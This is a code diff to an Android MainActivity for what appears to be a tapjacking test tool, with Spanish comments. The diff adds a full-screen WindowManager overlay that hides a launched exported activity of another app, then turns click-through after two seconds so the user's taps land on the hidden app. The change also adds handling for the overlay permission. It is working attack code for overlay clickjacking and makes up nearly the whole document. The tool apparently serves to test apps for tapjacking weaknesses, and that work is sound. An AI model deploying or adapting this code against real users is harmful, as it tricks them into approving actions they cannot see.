@@ -7,14 +7,20 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.graphics.PixelFormat;
 import android.graphics.drawable.ColorDrawable;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
 import android.text.Editable;
 import android.text.TextUtils;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
+import android.view.WindowManager;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
@@ -33,6 +39,8 @@ import java.util.List;
 import petrov.kristiyan.colorpicker.ColorPicker;
 
 public class MainActivity extends AppCompatActivity {
+    private static final int REQUEST_OVERLAY_PERMISSION = 1000;
+
     private EditText delayField;
     private EditText editExportedActivity;
     private EditText editCustomText;
@@ -40,6 +48,10 @@ public class MainActivity extends AppCompatActivity {
     private Button buttonColorPicker;
     private CheckBox checkboxShowLogo;
     private String[] packagesArr;
+
+    // Variables para el overlay real
+    private WindowManager windowManager;
+    private View overlayView;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -55,27 +67,10 @@ public class MainActivity extends AppCompatActivity {
 
         configureDropDown();
         loadPackages();
-    }
 
-//    private void configureDropDown() {
-//        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
-//            @Override
-//            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
-//                final String currentPackage = packagesArr[position];
-//                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
-//                if (launchIntent == null || launchIntent.getComponent() == null) {
-//                    setStartActivity("");
-//                    return;
-//                }
-//                setStartActivity(launchIntent.getComponent().getClassName());
-//            }
-//
-//            @Override
-//            public void onNothingSelected(AdapterView<?> parent) {
-//                setStartActivity("");
-//            }
-//        });
-//    }
+        // Inicializar WindowManager
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+    }
 
     private void configureDropDown() {
         packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
@@ -83,14 +78,12 @@ public class MainActivity extends AppCompatActivity {
             public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                 final String currentPackage = packagesArr[position];
 
-                // Solo poner el nombre del paquete, no la actividad completa
                 Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
                 if (launchIntent == null || launchIntent.getComponent() == null) {
                     setStartActivity("");
                     return;
                 }
 
-                // Aquí va solo el nombre de la actividad principal
                 String activityName = launchIntent.getComponent().getClassName();
                 setStartActivity(activityName);
             }
@@ -107,6 +100,12 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void runTapJacker(View view) {
+        // Verificar permisos de overlay primero
+        if (!checkOverlayPermission()) {
+            requestOverlayPermission();
+            return;
+        }
+
         // Validar que el campo de delay no esté vacío
         String delayText = delayField.getText().toString().trim();
         if (TextUtils.isEmpty(delayText)) {
@@ -134,32 +133,180 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        final Toast overlay = createOverlay();
-        fireOverlay(overlay, delay);
+        // Crear y mostrar overlay real
+        createRealOverlay(delay);
         launchExportedActivity(packageName, exportedActivityName);
     }
 
-    private void fireOverlay(final Toast toast, final int delay) {
-        Thread t = new Thread() {
-            public void run() {
-                int timer = delay;
-                while (timer > 0) {
-                    toast.show();
-                    if (timer == 1) {
-                        Intent intent = new Intent(MainActivity.this, MainActivity.class);
-                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        startActivity(intent);
-                    }
-                    try {
-                        sleep(1000);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    timer--;
-                }
+    private boolean checkOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            return Settings.canDrawOverlays(this);
+        }
+        return true; // Para versiones anteriores a Android 6.0
+    }
+
+    private void requestOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
+            Toast.makeText(this, "Por favor, otorga permisos de overlay para continuar", Toast.LENGTH_LONG).show();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQUEST_OVERLAY_PERMISSION) {
+            if (checkOverlayPermission()) {
+                Toast.makeText(this, "Permisos otorgados. Intenta de nuevo.", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "Permisos necesarios para el tapjacking", Toast.LENGTH_SHORT).show();
             }
-        };
-        t.start();
+        }
+    }
+
+//    private void createRealOverlay(final int delay) {
+//        try {
+//            // Inflar el layout del overlay
+//            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
+//            overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
+//
+//            // Configurar parámetros del overlay
+//            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+//                    WindowManager.LayoutParams.MATCH_PARENT,
+//                    WindowManager.LayoutParams.MATCH_PARENT,
+//                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+//                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+//                            WindowManager.LayoutParams.TYPE_PHONE,
+//                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+//                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+//                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+//                    PixelFormat.TRANSLUCENT
+//            );
+//
+//            params.gravity = Gravity.TOP | Gravity.LEFT;
+//            params.x = 0;
+//            params.y = 0;
+//
+//            // Configurar elementos del overlay
+//            configureOverlayElements(overlayView);
+//
+//            // Mostrar overlay
+//            windowManager.addView(overlayView, params);
+//            Log.d("TAPJACKER", "Overlay mostrado correctamente");
+//
+//            // Programar la eliminación del overlay
+//            Handler handler = new Handler();
+//            handler.postDelayed(new Runnable() {
+//                @Override
+//                public void run() {
+//                    removeOverlay();
+//                }
+//            }, delay * 1000);
+//
+//        } catch (Exception e) {
+//            Log.e("TAPJACKER", "Error creando overlay: " + e.getMessage());
+//            Toast.makeText(this, "Error creando overlay: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+//        }
+//    }
+
+    private void createRealOverlay(final int delay) {
+        try {
+            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
+            overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
+
+            // OPCIÓN 1: Overlay que permite algunos clicks
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                            WindowManager.LayoutParams.TYPE_PHONE,
+                    // Flags que permiten que algunos toques pasen
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    PixelFormat.TRANSLUCENT
+            );
+
+            // OPCIÓN 2: Hacer overlay semi-transparente después de 2 segundos
+            params.gravity = Gravity.TOP | Gravity.LEFT;
+            params.x = 0;
+            params.y = 0;
+
+            configureOverlayElements(overlayView);
+            windowManager.addView(overlayView, params);
+
+            // Hacer el overlay "clickeable" después de 2 segundos
+            Handler handler = new Handler();
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    makeOverlayClickThrough();
+                }
+            }, 2000); // 2 segundos
+
+            // Remover completamente después del delay total
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    removeOverlay();
+                }
+            }, delay * 1000);
+
+        } catch (Exception e) {
+            Log.e("TAPJACKER", "Error creando overlay: " + e.getMessage());
+        }
+    }
+
+    // Nuevo método para hacer el overlay "transparente" a los clicks
+    private void makeOverlayClickThrough() {
+        if (overlayView != null && windowManager != null) {
+            try {
+                // Actualizar parámetros del overlay para permitir clicks
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+                                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                                WindowManager.LayoutParams.TYPE_PHONE,
+                        // Flags que permiten que TODOS los toques pasen
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                        PixelFormat.TRANSLUCENT
+                );
+
+                params.gravity = Gravity.TOP | Gravity.LEFT;
+                params.x = 0;
+                params.y = 0;
+
+                // Actualizar el overlay con los nuevos parámetros
+                windowManager.updateViewLayout(overlayView, params);
+                Log.d("TAPJACKER", "Overlay ahora permite clicks");
+
+            } catch (Exception e) {
+                Log.e("TAPJACKER", "Error actualizando overlay: " + e.getMessage());
+            }
+        }
+    }
+
+    private void removeOverlay() {
+        try {
+            if (windowManager != null && overlayView != null) {
+                windowManager.removeView(overlayView);
+                overlayView = null;
+                Log.d("TAPJACKER", "Overlay removido correctamente");
+
+                // Volver a la actividad principal
+                Intent intent = new Intent(MainActivity.this, MainActivity.class);
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            Log.e("TAPJACKER", "Error removiendo overlay: " + e.getMessage());
+        }
     }
 
     void launchExportedActivity(final String packageName, final String exportedActivityName) {
@@ -229,7 +376,6 @@ public class MainActivity extends AppCompatActivity {
             return false;
         }
 
-        // Verificar si el paquete está instalado
         try {
             getPackageManager().getPackageInfo(packageName, 0);
         } catch (PackageManager.NameNotFoundException e) {
@@ -240,24 +386,11 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-    private Toast createOverlay() {
-        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
-        Toast overlay = Toast.makeText(this, "", Toast.LENGTH_SHORT);
-        View overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
-        overlay.setView(overlayView);
-        overlay.setGravity(Gravity.FILL, 0, 0);
-
-        configureOverlayElements(overlayView);
-
-        return overlay;
-    }
-
     private void configureOverlayElements(View overlayView) {
         int overlayColor;
         try {
             overlayColor = ((ColorDrawable) buttonColorPicker.getBackground()).getColor();
         } catch (Exception e) {
-            // Fallback a color por defecto si hay error obteniendo el color
             overlayColor = Color.GREEN;
         }
 
@@ -282,19 +415,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    /**
-     * Loads available application packages to the dropdown menu
-     */
-//    private void loadPackages() {
-//        List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
-//        List<String> filtered = filterPackages(packages);
-//        packagesArr = new String[filtered.size()];
-//        packagesArr = filtered.toArray(packagesArr);
-//
-//        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, packagesArr);
-//        packagesDropDown.setAdapter(adapter);
-//    }
-
     private void loadPackages() {
         Log.d("DEBUG", "=== INICIANDO CARGA DE PAQUETES ===");
 
@@ -310,7 +430,6 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // Mostrar los primeros 5 para verificar
         for (int i = 0; i < Math.min(5, filtered.size()); i++) {
             Log.d("DEBUG", "App " + (i+1) + ": " + filtered.get(i));
         }
@@ -324,21 +443,6 @@ public class MainActivity extends AppCompatActivity {
         Log.d("DEBUG", "✅ Dropdown configurado con " + packagesArr.length + " apps");
     }
 
-    /**
-     * Filter packages
-     */
-//    private List<String> filterPackages(final List<ApplicationInfo> packages) {
-//        List<String> filtered = new ArrayList<>();
-//
-//        for (ApplicationInfo packageInfo : packages) {
-//            final String packageName = packageInfo.packageName;
-//            if (!packageName.contains("com.android")) {
-//                filtered.add(packageName);
-//            }
-//        }
-//        return filtered;
-//    }
-
     private List<String> filterPackages(final List<ApplicationInfo> packages) {
         List<String> filtered = new ArrayList<>();
         PackageManager pm = getPackageManager();
@@ -350,11 +454,9 @@ public class MainActivity extends AppCompatActivity {
         for (ApplicationInfo packageInfo : packages) {
             final String packageName = packageInfo.packageName;
 
-            // Verificar si la app tiene actividad launcher (apps instalables)
             Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
 
             if (launchIntent != null) {
-                // Excluir solo las apps básicas del sistema que no necesitamos
                 if (!packageName.startsWith("com.android.") &&
                         !packageName.startsWith("android") &&
                         !packageName.equals("com.google.android.packageinstaller") &&
@@ -363,7 +465,6 @@ public class MainActivity extends AppCompatActivity {
                     filtered.add(packageName);
                     count++;
 
-                    // Log para debugging (mostrar solo los primeros 10)
                     if (count <= 10) {
                         Log.d("FILTER", "AGREGADO " + count + ": " + packageName);
                     }
@@ -373,7 +474,6 @@ public class MainActivity extends AppCompatActivity {
 
         Log.d("FILTER", "=== FILTRO COMPLETADO: " + filtered.size() + " apps encontradas ===");
 
-        // Si no encuentra muchas apps, mostrar todas las que tienen launcher
         if (filtered.size() < 5) {
             Log.d("FILTER", "Pocas apps encontradas, usando filtro más amplio...");
             filtered.clear();
@@ -404,5 +504,12 @@ public class MainActivity extends AppCompatActivity {
                 // No operation
             }
         });
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // Asegurar que el overlay se remueva si la actividad se destruye
+        removeOverlay();
     }
 }
